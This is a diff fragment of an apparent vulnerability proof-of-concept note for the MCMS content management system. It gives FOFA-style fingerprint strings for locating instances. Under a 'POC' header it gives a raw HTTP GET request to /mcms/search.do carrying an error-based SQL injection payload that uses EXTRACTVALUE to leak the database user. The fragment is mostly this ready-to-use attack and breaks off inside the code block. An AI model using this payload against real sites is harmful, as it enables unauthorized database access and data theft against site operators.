@@ -10,7 +10,7 @@ body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.
 
 
 
-## poc
+## POC
 
 ```
 GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,md5(8789),user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
